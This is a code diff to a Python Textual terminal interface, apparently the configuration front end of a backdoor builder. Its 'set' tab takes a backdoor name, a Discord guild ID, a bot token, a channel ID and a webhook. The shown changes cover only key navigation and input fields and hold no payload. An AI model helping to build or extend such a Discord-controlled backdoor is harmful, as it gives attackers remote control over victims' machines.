@@ -1,12 +1,10 @@
 from textual.app import App, ComposeResult
-from textual.widgets import Button, Static, Log
+from textual.widgets import Static
 from textual.containers import Center, Vertical, Horizontal, Container
+from textual.widgets import Label, Input, Button
 from textual.screen import Screen
 from textual.widget import Widget
 from textual.reactive import reactive
-from textual.timer import Timer
-import pyperclip
-import subprocess
 
 HELP_TABS = [
     ("help", "This is the help section. Use up/down arrows to navigate."),
@@ -44,13 +42,6 @@ class TabScreen(Screen):
         self.help_tab_index = 0
         self.set_field_index = 0
         self.set_editing = False
-        self.set_values = {
-            "bakdoor_name": "",
-            "guild_id": "",
-            "bot_token": "",
-            "channel_id": "",
-            "webhook": "",
-        }
 
     def compose(self) -> ComposeResult:
         yield Center(
@@ -96,7 +87,15 @@ class TabScreen(Screen):
                     expand=False
                 )
         elif self.active_tab == "set":
-            return self.compose_set_tab()
+            return Center(
+                    Vertical(
+                    CLIField("Backdoor Name", id="bakdoor_name"),
+                    CLIField("Guild ID", id="guild_id"),
+                    CLIField("Bot Token", id="bot_token"),
+                    CLIField("Channel ID", id="channel_id"),
+                    CLIField("WebHook", id="webhook"),
+                    id="set-cli-fields"
+                ))
         elif self.active_tab == "download":
             return Static(
 
@@ -128,196 +127,99 @@ class TabScreen(Screen):
     def on_key(self, event):
         key = event.key
 
+        # --- Handle help tab navigation first ---
+        if self.active_tab == "help":
+            help_tab = self.query_one(HelpTab)
+            if key == "down":
+                help_tab.tab_index = (help_tab.tab_index + 1) % len(HELP_TABS)
+                help_tab.refresh()
+                return
+            elif key == "up":
+                help_tab.tab_index = (help_tab.tab_index - 1) % len(HELP_TABS)
+                help_tab.refresh()
+                return
+            # Allow tab switching (b/s/d/h/q) in help tab below
+
+        # --- Handle set tab CLI navigation and editing ---
         if self.active_tab == "set":
             fields = list(self.query("CLIField").results())
             if not fields:
                 return
-            # Remove all highlights
-            for field in fields:
-                field.selected = False
-            # Highlight current
-            fields[self.set_field_index].selected = True
 
-            if not self.set_editing:
-                # Only allow tab switching when NOT editing
-                if key in {"b", "s", "d", "h", "q"}:
-                    if key == "q":
-                        self.app.exit()
-                        return
-                    self.active_tab = {
-                        "b": "terminal",
-                        "s": "set",
-                        "d": "download",
-                        "h": "help"
-                    }[key]
-                    self.mount_tab_content()
-                    return
-                if key == "down":
-                    self.set_field_index = (self.set_field_index + 1) % len(fields)
-                elif key == "up":
-                    self.set_field_index = (self.set_field_index - 1) % len(fields)
-                elif key == "right":
-                    self.set_editing = True
-                    fields[self.set_field_index].editing = True
-                for i, field in enumerate(fields):
-                    field.selected = (i == self.set_field_index)
-            else:
-                # Pass key events to the field for editing
+            if self.set_editing:
                 fields[self.set_field_index].on_key(event)
                 if key == "left":
                     self.set_editing = False
                     fields[self.set_field_index].editing = False
-                    # Save value
-                    field_id = fields[self.set_field_index].id
-                    self.set_values[field_id] = fields[self.set_field_index].value
+                return
+
+            if key in {"b", "s", "d", "h", "q"}:
+                if key == "q":
+                    self.app.exit()
+                    return
+                self.active_tab = {
+                    "b": "terminal",
+                    "s": "set",
+                    "d": "download",
+                    "h": "help"
+                }[key]
+                self.mount_tab_content()
+                return
+
+            if key == "down":
+                self.set_field_index = (self.set_field_index + 1) % len(fields)
+            elif key == "up":
+                self.set_field_index = (self.set_field_index - 1) % len(fields)
+            elif key == "right":
+                self.set_editing = True
+                fields[self.set_field_index].editing = True
+
+            for i, field in enumerate(fields):
+                field.selected = (i == self.set_field_index)
             return
 
-        if key == "b":
-            self.active_tab = 0
-            self.mount_tab_content()
-        elif key == "s":
-            self.active_tab = 1
-            self.mount_tab_content()
-        elif key == "d":
-            self.active_tab = 2
-            self.mount_tab_content()
-        elif key == "h":
-            self.active_tab = 3
-            self.mount_tab_content()
-        if self.active_tab == "help":
-            if key == "up":
-                self.help_tab_index = (self.help_tab_index - 1) % len(HELP_TABS)
-            elif key == "down":
-                self.help_tab_index = (self.help_tab_index + 1) % len(HELP_TABS)
-            elif key == "b":
-                self.active_tab = "terminal"
-            elif key == "q":
+        # --- Handle tab switching for all other tabs ---
+        if key in {"b", "s", "d", "h", "q"}:
+            if key == "q":
                 self.app.exit()
                 return
-            self.mount_tab_content()
-            return
-
-        if key in {"s", "d", "h", "b"}:
             self.active_tab = {
+                "b": "terminal",
                 "s": "set",
                 "d": "download",
-                "h": "help",
-                "b": "terminal"
+                "h": "help"
             }[key]
             self.mount_tab_content()
-        elif key == "q":
-            self.app.exit()
-
-    def compose_set_tab(self):
-        fields = [
-            CLIField("Backdoor Name", value=self.set_values["bakdoor_name"], id="bakdoor_name"),
-            CLIField("Guild ID", value=self.set_values["guild_id"], id="guild_id"),
-            CLIField("Bot Token", value=self.set_values["bot_token"], id="bot_token"),
-            CLIField("Channel ID", value=self.set_values["channel_id"], id="channel_id"),
-            CLIField("WebHook", value=self.set_values["webhook"], id="webhook"),
-        ]
-        all_filled = all(f.value.strip() for f in fields)
-        children = fields
-        if all_filled and not any(f.editing for f in fields):
-            children.append(Button("Set Config", id="set-config-btn"))
-        return Vertical(*children, id="set-cli-fields")
-
-    async def on_button_pressed(self, event):
-        if event.button.id == "set-config-btn":
-            # Remove set tab content
-            set_tab = self.query_one("#set-cli-fields")
-            await set_tab.remove()
-            # Mount log widget
-            log = Log(highlight=True, id="tree-log")
-            await self.mount(log)
-            # Run 'tree' and stream output
-            proc = subprocess.Popen(
-                ["tree"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, shell=True
-            )
-            for line in proc.stdout:
-                log.write(line.rstrip())
-                log.scroll_end(animate=False)
-            proc.wait()
-
 
 class CLIField(Widget):
     value = reactive("")
     editing = reactive(False)
     selected = reactive(False)
-    cursor_visible = reactive(True)
-    MAX_WORDS = 150
-    MAX_DISPLAY = 48
 
     def __init__(self, label: str, value: str = "", id: str = None):
         super().__init__(id=id)
         self.label = label
         self.value = value
-        self._cursor_timer: Timer | None = None
-
-    def sanitize(self, text):
-        return " ".join(text.strip().split())
-
-    def truncate_middle(self, text):
-        max_len = self.MAX_DISPLAY
-        if len(text) <= max_len:
-            return text
-        keep = max_len // 2 - 3
-        return f"{text[:keep]}...{text[-keep:]}"
 
     def render(self):
-        cursor = "▏" if self.editing and self.cursor_visible else ""
-        left = f"{self.label:<14} "
-        middle = f" > "
-        display_value = self.truncate_middle(self.value)
-        right = f"{display_value}{cursor}"
+        prompt = f"{self.label:<14} > {self.value if self.value or self.editing else ''}"
         if self.selected:
-            return f"[reverse]{left}[/reverse]{middle}{right}"
-        return f"{left}{middle}{right}"
+            # Highlight like .selected in help tab
+            return f"[reverse]{prompt}[/reverse]"
+        return prompt
 
     def on_key(self, event):
         if self.editing:
-            words = self.value.split()
             if event.key == "enter":
-                self.value = self.sanitize(self.value)
                 self.editing = False
                 self.selected = True
                 self.refresh()
             elif event.key == "backspace":
                 self.value = self.value[:-1]
                 self.refresh()
-            elif event.key in ("ctrl+v", "paste"):
-                try:
-                    paste_text = pyperclip.paste()
-                    if paste_text:
-                        paste_text = self.sanitize(paste_text)
-                        new_words = paste_text.split()
-                        if len(words) + len(new_words) <= self.MAX_WORDS:
-                            self.value += paste_text
-                        else:
-                            allowed = self.MAX_WORDS - len(words)
-                            self.value += " ".join(new_words[:allowed])
-                        self.refresh()
-                except Exception:
-                    pass
             elif event.is_printable:
-                if len(words) < self.MAX_WORDS or event.character.isspace():
-                    self.value += event.character
-                    self.refresh()
-
-    async def watch_editing(self, editing: bool):
-        if editing:
-            if not self._cursor_timer:
-                self._cursor_timer = self.set_interval(0.5, self._toggle_cursor)
-        else:
-            if self._cursor_timer:
-                self._cursor_timer.stop()
-                self._cursor_timer = None
-            self.cursor_visible = True
-        self.refresh()
-
-    def _toggle_cursor(self):
-        self.cursor_visible = not self.cursor_visible
-        self.refresh()
+                self.value += event.character
+                self.refresh()
 
 
 class BaybayApp(App):
